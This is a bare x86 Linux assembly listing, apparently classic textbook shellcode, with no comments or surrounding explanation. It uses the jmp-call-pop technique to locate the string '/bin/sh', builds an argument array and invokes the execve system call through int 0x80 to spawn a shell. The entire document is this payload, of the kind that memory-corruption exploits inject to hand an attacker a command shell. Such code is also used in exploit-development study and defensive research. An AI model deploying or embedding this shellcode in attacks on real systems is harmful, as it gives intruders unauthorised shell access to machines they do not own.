jmp shellcall

shellcode:
	pop esi
	xor eax,eax
	mov byte [esi+7],al
	mov dword [esi+8],esi
	mov dword [esi+12],eax
	mov al,0xb
	lea ebx,[esi]
	lea ecx,[esi+8]
	lea edx,[esi+12]
	int 80h

shellcall:
	call shellcode
	db "/bin/sh"
